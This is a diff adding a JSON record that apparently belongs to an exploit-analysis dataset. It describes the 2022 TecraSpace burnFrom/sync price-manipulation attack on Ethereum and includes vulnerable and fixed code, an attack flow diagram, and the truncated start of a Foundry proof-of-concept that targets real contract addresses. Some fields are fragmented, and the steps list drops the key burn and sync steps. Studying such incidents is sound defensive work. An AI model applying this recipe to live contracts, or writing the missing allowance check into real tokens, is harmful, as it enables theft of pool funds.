@@ -1,0 +1,36 @@
+{
+ "id": "2022__2022-02-18_TecraSpace_BurnFromPriceManipulation",
+ "source_file": "2022/2022-02-18_TecraSpace_BurnFromPriceManipulation.md",
+ "title": "TecraSpace — burnFrom Price Manipulation Attack Analysis",
+ "date": "2022-02-18",
+ "protocol": "TecraSpace",
+ "chain": "Ethereum Mainnet",
+ "loss_raw": "~$639,222 (USDT)",
+ "loss_usd": 639222.0,
+ "root_cause": "Used `burnFrom()` to burn TCR from the Uniswap pool, then called `sync()` to force-update pool reserves, manipulating the TCR/USDT spot price to extract arbitrage profit",
+ "attack_tx": null,
+ "vulnerable_contract": "TCR 0xE38B72d6595FD3885d1D2F770aa23E94757F91a1",
+ "classes": [
+  "oracle-price-manipulation"
+ ],
+ "code_before": [
+  "❌ Vulnerable TCR token burnFrom (pseudocode)\ncontract TCRToken is ERC20 {\n\n    //",
+  "❌ No allowance validation, or callable from the pair address\n    function burnFrom(address account, uint256 amount) public {\n        //",
+  "❌ msg.sender allowance check missing or bypassable\n        _burn(account, amount);\n    }\n}\n\n// Uniswap V2 Pair sync()\nfunction sync() external lock {\n    //"
+ ],
+ "code_after": [
+  "✅ Correct burnFrom pattern\nfunction burnFrom(address account, uint256 amount) public {\n    //",
+  "✅ Allowance must be validated\n    uint256 currentAllowance = allowance(account, msg.sender);\n    require(currentAllowance >= amount, \"ERC20: burn amount exceeds allowance\");\n    unchecked {\n        _approve(account, msg.sender, currentAllowance - amount);\n    }\n    _burn(account, amount);\n}"
+ ],
+ "steps": [
+  "[1] ETH → USDT (UniswapV2, swapExactETHForTokens)",
+  "[2] USDT → TCR (UniswapV2, swapExactTokensForTokens)",
+  "reserve_TCR ↓↓ → TCR spot price ↑↑ (sharp increase)",
+  "[5] Held TCR → USDT (swapExactTokensForTokens)",
+  "→ Acquire large amount of USDT"
+ ],
+ "other_code": [
+  "Attacker (starting with 0.04 ETH)\n    │\n    ├─[1] ETH → USDT (UniswapV2, swapExactETHForTokens)\n    │\n    ├─[2] USDT → TCR (UniswapV2, swapExactTokensForTokens)\n    │       Acquire small amount of TCR\n    │\n    ├─[3] TCR.burnFrom(Pair Pool, pool_balance - 100_000_000)\n    │       ⚡ Burn large amount of TCR from pool\n    │       Bypass allowance validation\n    │\n    ├─[4] Pair.sync()\n    │       Update pool reserves:\n    │       reserve_TCR ↓↓ → TCR spot price ↑↑ (sharp increase)\n    │\n    ├─[5] Held TCR → USDT (swapExactTokensForTokens)\n    │       Swap at manipulated inflated TCR price\n    │       → Acquire large amount of USDT\n    │\n    └─[6] Net profit: ~$639,222 USDT",
+  "// SPDX-License-Identifier: UNLICENSED\npragma solidity 0.8.10;\n\nimport \"forge-std/Test.sol\";\n\ninterface ITCR is IERC20 {\n    // ⚡ Vulnerable function: allows burning TCR from the pair address\n    function burnFrom(address account, uint256 amount) external;\n}\n\ninterface IUniswapV2Pair {\n    function sync() external;\n    function getReserves() external view returns (uint112, uint112, uint32);\n}\n\ncontract ContractTest is Test {\n    ITCR TCR = ITCR(0xE38B72d6595FD3885d1D2F770aa23E94757F91a1);\n    IERC20 USDT = IERC20(0xdAC17F958D2ee523a2206206994597C13D831ec7);\n    IUniswapV2Router router = IUniswapV2Router(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);\n    IUniswapV2Pair pair = IUniswapV2Pair(0x420725A69E79EEffB000F98Ccd78a52369b6C5d4);\n\n    function setUp() public {\n        vm.createSelectFork"
+ ]
+}
